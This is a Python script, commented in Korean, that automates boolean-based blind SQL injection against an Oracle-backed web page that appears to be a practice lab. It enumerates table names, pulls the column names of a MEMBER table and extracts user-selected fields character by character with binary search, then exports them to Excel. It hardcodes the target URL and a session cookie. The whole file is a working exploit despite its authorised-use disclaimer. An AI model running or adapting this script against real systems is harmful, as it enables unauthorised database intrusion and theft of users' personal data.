# -*- coding: utf-8 -*-
"""
안전/호환성 개선된 Blind-SQL 자동화 스크립트
(변수명은 영문으로 바꾸고, 한글은 주석으로 설명)
주의: 반드시 허가된 테스트 환경에서만 사용
"""

import requests
import pandas as pd
import os
import time
import urllib.parse
from pathlib import Path

# --------- 설정 영역 ----------
BASE_URL = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"
COOKIES = {
    "JSESSIONID": "B331181DD7FBA785CAC7C55C3DE3ABBD"
}
# 요청 옵션
REQUEST_TIMEOUT = 10  # seconds
RETRY_COUNT = 2
SLEEP_BETWEEN_REQUESTS = 0.08  # 서버 과부하 방지 (초)
# --------------------------------

def send_get(url: str):
    """GET 요청(간단한 재시도 포함). 예외 시 None 반환."""
    for attempt in range(RETRY_COUNT + 1):
        try:
            resp = requests.get(url, cookies=COOKIES, timeout=REQUEST_TIMEOUT)
            # 응답 인코딩 강제 지정이 필요하면 resp.encoding = 'utf-8'
            return resp
        except requests.RequestException as e:
            if attempt >= RETRY_COUNT:
                raise
            time.sleep(0.3)
    return None

def binary_find(query: str, max_value: int = 65535) -> int:
    """
    이진 탐색으로 boolean-based blind 결과에서 숫자값 추출
    query: SQL 비교 대상이 되는 식(예: select count(table_name) from user_tables)
    반환값: 찾은 정수값 (끝값)
    """
    low = 1
    high = max_value
    # URL에 바로 붙일 query 부분은 URL-인코딩해서 보냄
    while low < high:
        mid = (low + high) // 2
        attack_condition = f"({query}) > {mid}"
        # 공격 URL 생성: BASE_URL + " and " + encoded_query
        encoded = urllib.parse.quote(attack_condition, safe='')
        attack_url = f"{BASE_URL} and {encoded}"
        resp = send_get(attack_url)
        # 간단한 성공 판정: 페이지에 특정 단어가 존재하면 true로 간주
        # (원래 코드에서는 "애플워치" 체크) — 여기서는 동일하게 유지
        if resp is None:
            raise RuntimeError("No response received")
        text = resp.text
        time.sleep(SLEEP_BETWEEN_REQUESTS)
        if "애플워치" in text:
            low = mid + 1
        else:
            high = mid
    return high

def safe_chr(code: int) -> str:
    """정수 코드값을 문자로 변환(문자 범위를 벗어나면 ?로 처리)"""
    try:
        return chr(code)
    except Exception:
        return "?"

def get_desktop_path() -> str:
    """윈도우/다양한 환경에서 데스크탑 경로를 얻되, 없으면 cwd 반환"""
    desktop = Path.home() / "Desktop"
    if desktop.exists():
        return str(desktop)
    # 한국어 윈도우 사용자 계정에서 '바탕 화면'일 경우 시도
    alt = Path.home() / "바탕 화면"
    if alt.exists():
        return str(alt)
    # 없으면 현재 작업 디렉토리 반환
    return str(Path.cwd())

def main():
    # ---------------- 전체 테이블명 추출 ----------------
    print("전체 테이블 개수 조회...")
    table_count_query = "select count(table_name) from user_tables"
    table_count = binary_find(table_count_query, 255)
    print(f"전체 테이블 개수: {table_count}개\n")

    all_tables = []
    for rownum in range(1, table_count + 1):
        # 각 테이블명 길이
        length_query = f"select length(a) from (select table_name a, rownum b from user_tables) where b={rownum}"
        name_len = binary_find(length_query, 255)
        table_name = ""
        for pos in range(1, name_len + 1):
            ascii_query = f"select ascii(substr(a,{pos},1)) from (select table_name a, rownum b from user_tables) where b={rownum}"
            code = binary_find(ascii_query, 255)
            table_name += safe_chr(code)
        all_tables.append(table_name)
        print(f"{rownum}번째 테이블명: {table_name}")

    # ---------------- MEMBER 테이블 처리 ----------------
    if "MEMBER" in all_tables:
        print(f"\n[+] 'MEMBER' 테이블의 컬럼명 추출 중...\n")
        col_count_query = "select count(column_name) from user_tab_columns where table_name='MEMBER'"
        col_count = binary_find(col_count_query, 255)
        print(f"컬럼 개수: {col_count}\n")
        columns = []
        for cnum in range(1, col_count + 1):
            len_query = f"select length(a) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
            col_len = binary_find(len_query, 255)
            col_name = ""
            for pos in range(1, col_len + 1):
                ascii_query = f"select ascii(substr(a,{pos},1)) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
                code = binary_find(ascii_query, 255)
                col_name += safe_chr(code)
            columns.append(col_name)
            print(f"{cnum}번째 컬럼명: {col_name}")

        # 사용자에게 추출할 컬럼 선택
        print("\n[+] 추출할 컬럼명을 쉼표로 구분하여 입력하세요.")
        print(f"예시: {', '.join(columns[:5])} ...")
        user_input = input("입력: ").strip()
        chosen = [c.strip().upper() for c in user_input.split(",") if c.strip()]
        chosen = [c for c in chosen if c in columns]

        if not chosen:
            print("선택한 컬럼이 존재하지 않습니다. 프로그램을 종료합니다.")
            return

        print(f"\n[+] 선택된 컬럼: {', '.join(chosen)}")
        print(f"[+] MEMBER 테이블의 첫 번째 데이터(rownum=1) 출력\n")
        print("TABLE_NAME: MEMBER\n")

        # rownum=1 데이터를 각 컬럼별로 추출
        result_data = {col: [] for col in chosen}
        for col in chosen:
            # 컬럼 길이 조회
            length_query = f"select length({col}) from (select {col}, rownum r from MEMBER) where r=1"
            char_len = binary_find(length_query, 255)

            value = ""
            for pos in range(1, char_len + 1):
                if col.upper() == "NAME":
                    # 한글 복원: unicode() 사용
                    unicode_query = f"select unicode(substr({col},{pos},1)) from (select {col}, rownum r from MEMBER) where r=1"
                    codeval = binary_find(unicode_query, 65535)
                    value += safe_chr(codeval)
                else:
                    ascii_query = f"select ascii(substr({col},{pos},1)) from (select {col}, rownum r from MEMBER) where r=1"
                    codeval = binary_find(ascii_query, 255)
                    value += safe_chr(codeval)
            result_data[col].append(value)
            print(f"{col}: {value}")

        # 엑셀 저장 여부
        save = input("\n엑셀로 저장하시겠습니까? (yes/no): ").strip().lower()
        if save == "yes":
            desktop = get_desktop_path()
            filename = "MEMBER_data.xlsx"
            save_path = os.path.join(desktop, filename)
            df = pd.DataFrame(result_data)
            try:
                with pd.ExcelWriter(save_path, engine="openpyxl") as writer:
                    df.to_excel(writer, index=False, sheet_name="MEMBER")
                print(f"\n✅ 엑셀 저장 완료: {save_path}")
                print("📄 시트 이름: MEMBER")
            except PermissionError:
                # 권한 문제(파일 열림 등) 발생 시 현재 작업 디렉토리에 저장
                fallback = os.path.join(str(Path.cwd()), filename)
                df.to_excel(fallback, index=False, sheet_name="MEMBER")
                print(f"\n⚠️ 권한 문제로 데스크탑 저장 실패. 대신 저장됨: {fallback}")
        else:
            print("\n🚫 엑셀 저장하지 않고 종료합니다.")
    else:
        print("\nMEMBER 테이블이 존재하지 않습니다.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단되었습니다.")
    except Exception as e:
        print(f"\n오류 발생: {e}")
